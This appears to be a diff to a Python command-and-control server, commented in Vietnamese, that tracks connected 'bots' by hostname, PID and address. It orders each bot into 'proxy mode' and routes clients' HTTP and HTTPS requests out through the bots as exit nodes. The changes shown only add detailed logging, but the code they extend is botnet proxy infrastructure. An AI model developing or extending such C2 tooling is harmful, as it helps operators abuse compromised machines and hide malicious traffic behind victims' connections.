@@ -60,8 +60,11 @@ class C2ProxyServer:
         
         self.running = True
         print(f"✅ C2 Proxy Server started successfully!")
-        print(f"   C2 Server: {self.c2_host}:{self.c2_port}")
-        print(f"   Proxy Server: {self.c2_host}:{self.proxy_port}")
+        print(f"   🖥️  C2 Server: {self.c2_host}:{self.c2_port}")
+        print(f"   🌐 Proxy Server: {self.c2_host}:{self.proxy_port}")
+        print(f"   ⏰ Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"   🔄 Waiting for bot connections...")
+        print(f"   📊 Ready to handle proxy requests...")
         
     def start_c2_server(self):
         """Khởi động C2 server để nhận kết nối từ bot"""
@@ -146,7 +149,13 @@ class C2ProxyServer:
                         'last_seen': datetime.now()
                     }
                     
+                    # Thông báo chi tiết khi bot kết nối thành công
                     print(f"✅ Bot {bot_id} ({hostname}) connected successfully")
+                    print(f"   📍 Address: {bot_addr[0]}:{bot_addr[1]}")
+                    print(f"   🖥️  Hostname: {hostname}")
+                    print(f"   🔢 PID: {pid}")
+                    print(f"   ⏰ Connected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                    print(f"   🔗 Total bots connected: {len(self.connected_bots)}")
                     
                     # Gửi lệnh bật proxy mode
                     self.enable_bot_proxy_mode(bot_id)
@@ -186,6 +195,10 @@ class C2ProxyServer:
             
             bot_info['proxy_mode'] = True
             print(f"🔗 Bot {bot_id} enabled as proxy exit node")
+            print(f"   🚀 Proxy mode: ACTIVE")
+            print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
+            print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
+            print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
             
         except Exception as e:
             print(f"❌ Error enabling proxy mode for bot {bot_id}: {e}")
@@ -239,8 +252,14 @@ class C2ProxyServer:
             # Chọn bot exit node
             selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes)
             if not selected_bot:
+                print(f"❌ No available exit nodes for proxy request from {client_addr}")
                 client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
                 return
+                
+            print(f"🌐 New proxy request from {client_addr}")
+            print(f"   🎯 Target: {target_host}:{target_port} ({'HTTPS' if is_https else 'HTTP'})")
+            print(f"   🤖 Selected bot: {selected_bot}")
+            print(f"   🔗 Connection ID: {connection_id}")
                 
             # Tạo proxy connection
             self.active_proxy_connections[connection_id] = {
@@ -433,6 +452,9 @@ class C2ProxyServer:
             del self.connected_bots[bot_id]
             
             print(f"👋 Bot {bot_id} disconnected")
+            print(f"   ⏰ Disconnected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            print(f"   🔗 Remaining bots: {len(self.connected_bots)}")
+            print(f"   🔄 Remaining exit nodes: {len(self.bot_exit_nodes)}")
             
     def start_health_monitoring(self):
         """Khởi động health monitoring"""
@@ -461,6 +483,9 @@ class C2ProxyServer:
     def stop(self):
         """Dừng server"""
         print("🛑 Stopping C2 Proxy Server...")
+        print(f"   ⏰ Stopped at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"   🔗 Active bots: {len(self.connected_bots)}")
+        print(f"   🌐 Active connections: {len(self.active_proxy_connections)}")
         self.running = False
         
         # Close all connections
